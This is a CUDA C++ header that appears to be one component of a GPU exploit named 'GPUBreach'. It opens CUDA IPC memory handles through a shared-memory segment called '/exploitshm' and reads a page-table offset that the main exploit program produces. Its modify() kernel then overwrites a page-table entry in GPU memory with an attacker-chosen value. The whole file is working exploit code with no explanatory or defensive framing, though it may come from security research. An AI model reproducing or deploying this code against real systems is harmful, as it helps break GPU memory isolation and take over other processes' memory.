#include <utility>
#include <iostream>
#include <fstream>
#include <sys/mman.h>
#include <fcntl.h>
#include <filesystem>
#include <unistd.h>
#ifndef TRANSFER_CUH
#define TRANSFER_CUH

__global__ void memset_ptr(uint8_t *dst, uint64_t src, uint64_t size)
{
    for (size_t i = 0; i < size; i += 8) {
        *(uint64_t*)(dst + i) = src; // array-style access
    }
}

void
paused ()
{
    std::cin.clear();
    while (std::cin.get() != '\n');
}

#define gpuErrchk(ans) { gpuAssert((ans), __FILE__, __LINE__); }
inline void gpuAssert(cudaError_t code, const char *file, int line, bool abort=true)
{
   if (code != cudaSuccess) 
   {
      fprintf(stderr,"GPUassert: %s %s %d\n", cudaGetErrorString(code), file, line);
      if (abort) exit(code);
   }
}


void* openIPCPointer(int i)
{
    void* pointer;
    // cudaIpcMemHandle_t handle;
    // std::ifstream file(filename, std::ios::binary);
    // file.read(reinterpret_cast<char*>(&handle), sizeof(&handle));
    // file.close();
    // cudaIpcOpenMemHandle(&pointer, handle,
    //                      cudaIpcMemLazyEnablePeerAccess);
    int shm_fd = shm_open("/exploitshm", O_RDWR, 0666);
   if (shm_fd == -1) {
      std::cerr << "Error opening shared memory" << std::endl;
   }

   // Step 2: Map shared memory into address space
   cudaIpcMemHandle_t* shared_data = (cudaIpcMemHandle_t*)mmap(0, sizeof(cudaIpcMemHandle_t) * 2, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
   if (shared_data == MAP_FAILED) {
      std::cerr << "Error mapping shared memory" << std::endl;
   }
   gpuErrchk(cudaPeekAtLastError());
   cudaIpcOpenMemHandle(&pointer, shared_data[i],
                         cudaIpcMemLazyEnablePeerAccess);
gpuErrchk(cudaPeekAtLastError());

    std::cout << "Opened CUDA IPC pointer from " << pointer << '\n';
    return pointer;
}

uint64_t getPTOfs(std::string filename)
{
    std::cout << "Please go to GPUBreach program terminal to continue. \n"
               "Press\033[1;32mEnter Key\033[0m after GPUBreach has finished executing to continue..."
            << '\n';
    paused();
    uint64_t ofs;
    std::ifstream file(filename, std::ios::binary);
    file.read(reinterpret_cast<char*>(&ofs), sizeof(ofs));
    file.close();
    return ofs;
}

void modify(void* pointer, uint64_t ofs, uint64_t PTE)
{
    memset_ptr<<<1,1>>>((uint8_t *)pointer + ofs, PTE, 8);
    cudaDeviceSynchronize();
}

#endif /* TRANSFER_CUH */
